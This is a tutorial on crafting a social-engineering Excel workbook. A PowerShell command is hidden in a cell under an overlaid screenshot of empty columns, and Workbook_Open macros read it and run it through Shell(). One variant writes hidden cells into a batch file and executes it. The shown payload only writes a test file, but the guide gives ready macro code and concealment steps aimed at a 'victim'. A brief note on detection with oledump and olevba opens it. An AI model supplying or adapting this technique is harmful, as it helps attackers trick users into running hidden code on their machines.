# Social Engineering Using Hidden Macros In Excel

NOTE: This method is detectable if the analysis or victim has any technical knowledge of macros. Simply running a tool such as oledump or olevba against the document will return the macros, though they won't immediately reveal any of the real activity.

All that will be shown is that the macros are extracting code from a specific column & executing it using Shell(), which is admittedly still suspicious:

![](/imgs/img1.png)

And if we navigate to BG1 which is where the code appears to be, we don't immediately see anything suspicious:

![](/imgs/img2.png)

But if you hover your mouse over BG1 (or simply look a little more closely & notice the misaligned columns), then you'll see that there's an image overlaying the code:

![](/imgs/img3.png)

![](/imgs/img4.png)

Obviously, someone with a bit more patience could perfect the screenshot of the empty columns & overlay it on top of the code to make it less noticable.

But then again, there's always the method of using `MsgBox` to reveal the code that is being extracted:

![](/imgs/img5.png)

# Crafting the Document

## What's Needed:

1. Screenshot of a set of empty columns to overlay on top of the code, example:

![](/imgs/img6.png)

2. Macros that extract the code from the workbook & run the data:

```
Private Sub Workbook_Open()
Data = Sheet1.Range("BG1")
Shell(Data)
End Sub
```

* Data = Sheet1.Range("BG1") Simply looks at the row located at BG1 & extracts whatever is in that row & places it inside the variable *Data*

3. Code that will be extracted & executed upon the document opening & the user clicking "Enable Content"

```
powershell.exe -exec bypass -C echo "Hello world" > C:\Users\Desktop\Conduct\Desktop\test.txt
```

After you've inserted the code into whatever column you'd like, simply insert the image of the empty columns over the code (Insert > Illustrations > Pictures)

Then insert the macros in ThisWorkbook & change the **Range()** part to match up with your column. So if you inserted the data in column A and it's on the 1st row, it'd be **Range("A1")**


## Writing Multiple Lines To a File

Writing multiple lines to a file is a piece of cake and only requires the addition of a few lines of code.

The macro code used is here:

```
Private Sub Workbook_Open()
1. Dim Path As String
2. Dim FileNumber As Integer
3. FileNumber = FreeFile
4. Data = Sheet1.Range("BG1")
5. Data2 = Sheet1.Range("BG2")
6. Path = "test.bat"
7. Open Path For Output As FileNumber
8.    Print #FileNumber, Data
9.    Print #FileNumber, Data2
10.    Close FileNumber
11. Shell(Path)
End Sub
```

* Lines 1-3 are static, keep those as is. They simply define the variables used
* Lines 4-6 are dynamic. You will want to change the strings in 4 & 5 to be where your code is located in terms of the excel worksheet. Change line 6 to the file path you desire.
* Lines 7-9 are also dynamic, they simply open the file & write to the file the data that has been extracted. Lines 8 & 9 in particular are the lines responsible for writing the data to the file.


Simply insert the code you want to write to a file into the workbook & take note of the column & row it's located in & change the Data & Data1 variable to match up with your column & row (and add more variables if needed). Then overlay the code in the workbook with the screenshot of the empty rows, and boom!

A sample document is available, I hope this all made sense.
